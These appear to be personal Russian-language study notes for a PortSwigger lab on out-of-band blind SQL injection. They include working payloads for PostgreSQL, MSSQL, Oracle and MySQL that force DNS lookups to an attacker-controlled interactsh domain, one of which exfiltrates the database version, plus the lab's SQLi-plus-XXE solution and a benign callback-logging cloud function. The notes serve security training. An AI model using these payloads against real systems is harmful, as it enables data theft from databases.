# Blind SQL injection vulnerabilities
# *СЛЕПЫЕ SQLi  (6/7 лаба в этой теме)

##   Exploiting blind SQL injection using out-of-band (OAST) techniques
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
слепые иньекции  (out-of-band) ВНЕПОЛОСТНЫЕ OAST = OOB

==запуск внеполосного сетевое взаимодействие с системой==

**наиболее эффективным является DNS (служба доменных имен). Многие производственные сети позволяют свободно выходить DNS-запросы, потому что они необходимы для нормальной работы производственных систем.

напоминалка мне
==select from where and== 

моя облачная функция созданная в яндек облач функции : код функции в конце тут
  
https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6t


для перехвата DNS запросов как аналог BURP COLOBORATION
буду использовать https://app.interactsh.com

дает мне токен например: ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun

-----------------
база по OAST 

есть два случая, когда приложение сервер выполняют запросы 
СИНХРОННО и АСИНХРОННО

когда синхронно то сперва идет запрос к бд и в зависимости от ответа нам вохарващются данные измененные

когда ==АСИНХРОННО== то   **Задержки в браузере не будет**.: 

Когда приложение выполняет уязвимый SQL-запрос **асинхронно**, классические методы (ошибки, логические ответы, временные задержки) перестают работать
В этом случае можно заставить базу данных выполнить сетевой запрос на сервер, который вы контролируете. Например, запрос вида `'; exec master..xp_dirtree '//ваш-домен.com/a'--` заставит MS SQL Server выполнить DNS-запрос к `ваш-домен.com`

**Идея**: Если вставить в поддомен данные из базы (например, `'admin'.ваш-домен.com`), они попадут в логи вашего сервера. Так можно напрямую **экспортировать данные** (пароли, ключи), а не угадывать их по битам



 # различия в синтаксисе для разных СУБД: OAST
```c
- **Microsoft SQL Server**: `xp_dirtree`, `xp_fileexist
    
- **Oracle**: `UTL_HTTP.REQUEST`, `UTL_INADDR.GET_HOST_ADDRESS`.
    
- **PostgreSQL**: Для DNS-запросов часто используются специальные расширения, вроде `dblink`или `COPY ... FROM PROGRAM` (с вызовом внешних команд, например `nslookup`). Вам предстоит это исследовать.
    
- **MySQL**: `LOAD_FILE()` (для чтения файлов через UNC-пути, которые могут генерировать DNS-запросы в Windows).
```

# 1) НАЙТИ ОТКРЫТЫЕ ПОРТЫ чтобы выбрать протокол для OAST-запроса (DNS, HTTP и т.д.)

**Основной инструмент** для поиска открытых портов — ==Nmap==

*- **Порт-нокаут (Port Knocking)** — это не инструмент для поиска, а **техника безопасности**. Сервер держит все порты закрытыми и открывает их только после получения правильной "последовательности стуков" (запросов) на определённые порты[](https://www.twingate.com/blog/glossary/port%20knocking). Это затрудняет обнаружение сервисов сканерами вроде Nmap.



### 📝 Как использовать ваш токен в SQL-инъекции

Вам нужно внедрить SQL-код, который заставит базу данных выполнить DNS- или HTTP-запрос к вашему уникальному поддомену.

**Общая схема полезной нагрузки:**  
`' || (ВАШ_SQL_КОД_С_ДАННЫМИ).ВАШ_ТОКЕН--`

токен мой сейчас
ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun


----------------
 **PostgreSQL (если удастся вызвать `dblink`):**
```sql
'||(SELECT dblink('host='||(SELECT version())||'.ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun user=test'))--
```
Эта полезная нагрузка попытается:
1. Выполнить подзапрос `(SELECT version())` (получить версию PostgreSQL).
2. Сконкатенировать (`||`) результат с вашим токеном, получив домен вида `PostgreSQL 16.0...ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun`
3. Через функцию `dblink` попытаться соединиться с этим хостом, что спровоцирует DNS-запрос.
---------------------


првоерка типа бд с простыи запросом:
```sql
// postgerSQL
' || (SELECT dblink('host=test.ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun'))--

// oracle
' || UTL_INADDR.GET_HOST_ADDRESS('test.YOUR-DOMAIN.oast.fun')--

// microsoft sql server
'; EXEC master..xp_dirtree '\\test.YOUR-DOMAIN.oast.fun\a'--

// mysql
' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\', 'test', '.', 'YOUR-DOMAIN', '.oast.fun\\\\a')))--

//postgerSQL
' || (SELECT dblink_connect('host=' || 'test.YOUR-DOMAIN.oast.fun' || ' user=test'))--
```

--------------
### ⚠️ Ключевые моменты для успеха
1. **Контекст и кодирование**: Полезная нагрузка должна корректно вписаться в исходный SQL-запрос. Иногда требуется кодирование URL или замена пробелов на комментарии (`/**/`).
2. **Синтаксис**: Обратите внимание на разницу в кавычках и конкатенации (`||` vs `+`).
3. **Привилегии**: Для выполнения некоторых функций (например, `xp_dirtree`, `dblink`) у пользователя БД должны быть соответствующие права.
4. **Проверка в Interact.sh**: После отправки каждого запроса проверяйте вкладку **"Interactions"** на interact.sh. Появление DNS-запроса укажет не только на наличие уязвимости, но и на тип БД.
-----------



# ЛАБА
Эта лаборатория содержит уязвимость слепой SQL-инъекции. Приложение использует отслеживающий файл cookie для аналитики и выполняет SQL-запрос, содержащий значение отправленного файла cookie.

SQL-запрос выполняется асинхронно и не влияет на ответ приложения. Тем не менее, вы можете инициировать внеполосные взаимодействия с внешним доменом.

Чтобы решить проблему, используйте уязвимость SQL-инъекции, чтобы вызвать поиск DNS в Burp Collaborator.

==проблема - burp просит только их dns иначе другой трафик они не пропускают поэтому не получится использовать мою облачную функцию или https://app.interactsh.com ==

50к в год стоит лицензия про
либо взять потом бесплатный период пробный! 

# вот решение

1. Посетите первую страницу магазина и используйте Burp Suite для перехвата и изменения запроса, содержащего файл cookie `TrackingId`.
2. Измените файл cookie `TrackingId`, изменив его на полезную нагрузку, которая вызовет взаимодействие с сервером Collaborator. Например, вы можете объединить SQL-инъекцию с основными методами XXE следующим образом:


```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
1. Щелк правой кнопкой мыши и выбрать "Вставить полезную нагрузку Collaborator", чтобы вставить поддомен Burp Collaborator, указанный в измененном файле cookie `TrackingId`.

описанного здесь решения достаточно просто для того, чтобы запустить поиск DNS и, таким образом, решить проблему лаборатории. В реальной ситуации вы будете использовать [Burp Collaborator], чтобы убедиться, что ваша полезная нагрузка действительно вызвала поиск DNS, и потенциально использовать это поведение для извлечения конфиденциальных данных из приложения. Мы обсудим эту технику в следующей лаборатории



-----

код облачн функци-приемника запросов
```python
import json

import os

  

def handler(event, context):

"""

Обработчик OAST-запросов для Яндекс Cloud Functions

"""

# 1. Сразу формируем строку лога

log_lines = []

log_lines.append("==🟣🟣🟣🟣🟣 СТАРТ 🟣🟣🟣🟣🟣 OAST INTERACTION RECEIVED ===")

# 2. Основная информация

log_lines.append(f"HTTP Method: {event.get('httpMethod', 'GET')}")

log_lines.append(f"Request Path: {event.get('path', '/')}")

log_lines.append(f"Request ID: {context.request_id}")

# 3. Query параметры (самое важное для OAST)

query_params = event.get('queryStringParameters', {})

if query_params:

log_lines.append(f"Query Parameters: {json.dumps(query_params, ensure_ascii=False)}")

else:

log_lines.append("No query parameters found")

# 4. Заголовки

headers = event.get('headers', {})

if headers:

# Фильтруем некоторые заголовки для краткости

filtered_headers = {k: v for k, v in headers.items()

if k.lower() not in ['authorization', 'cookie']}

log_lines.append(f"Headers: {json.dumps(filtered_headers, ensure_ascii=False, indent=2)}")

# 5. Тело запроса

body = event.get('body', '')

if body:

try:

parsed_body = json.loads(body)

log_lines.append(f"Body (JSON): {json.dumps(parsed_body, ensure_ascii=False, indent=2)}")

except:

log_lines.append(f"Body (raw, first 500 chars): {body[:500]}")

# 6. IP адрес (если доступен)

source_ip = event.get('requestContext', {}).get('identity', {}).get('sourceIp', 'UNKNOWN')

log_lines.append(f"Source IP: {source_ip}")

log_lines.append("=== END OF REQUEST ===")

# 7. В Яндекс.Облаке логи выводятся через print

for line in log_lines:

print(line)

# 8. Возвращаем пустой ответ

return {

'statusCode': 200,

'body': '',

'headers': {

'Content-Type': 'text/plain',

'Access-Control-Allow-Origin': '*'

}

}
```